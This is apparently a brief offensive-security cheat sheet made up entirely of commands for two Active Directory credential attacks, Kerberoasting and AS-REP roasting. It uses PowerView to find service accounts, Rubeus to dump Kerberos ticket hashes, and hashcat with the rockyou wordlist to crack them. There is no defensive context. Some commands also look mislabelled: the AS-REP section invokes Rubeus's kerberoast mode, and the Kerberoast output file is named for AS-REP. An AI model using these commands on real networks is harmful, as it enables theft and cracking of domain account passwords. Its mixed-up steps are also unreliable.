### Kerberoasting 
```
PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

Rubeus kerberoast /outfile:hashes.asreproast


hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
```

### ASREPRoasting
 
```
Rubeus kerberoast format:hashcat /outfile:hashes.asreproast

hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
```
